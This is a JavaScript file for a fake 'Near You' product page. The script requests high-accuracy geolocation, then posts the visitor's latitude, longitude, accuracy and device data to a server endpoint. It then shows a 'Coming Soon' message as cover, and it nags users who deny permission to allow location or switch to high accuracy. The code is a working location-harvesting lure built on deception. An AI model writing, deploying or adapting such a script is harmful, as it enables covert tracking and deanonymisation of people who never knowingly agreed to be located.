// Using relative path for Vercel API
const SERVERLESS_URL = "/api/save";

function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    
    var payload = {
      location: {
        latitude: lat,
        longitude: lon,
        accuracy: acc
      },
      device: window.deviceData || {},
      createdAt: new Date().toISOString()
    };

    $.ajax({
      type: 'POST',
      url: SERVERLESS_URL,
      contentType: 'application/json',
      data: JSON.stringify(payload),
      success: function(){$('#change').html('Coming Soon');}
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };
}

function showError(error)
{
  var errorMsg = 'An unknown error occurred';
  switch(error.code)
  {
    case error.PERMISSION_DENIED:
      errorMsg = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
    case error.POSITION_UNAVAILABLE:
      errorMsg = 'Location information is unavailable';
      break;
    case error.TIMEOUT:
      errorMsg = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
      break;
    case error.UNKNOWN_ERROR:
      errorMsg = 'An unknown error occurred';
      break;
  }

  var payload = {
    error: errorMsg,
    device: window.deviceData || {},
    createdAt: new Date().toISOString()
  };

  $.ajax({
    type: 'POST',
    url: SERVERLESS_URL,
    contentType: 'application/json',
    data: JSON.stringify(payload),
    success: function(){$('#change').html('Failed');}
  });
}
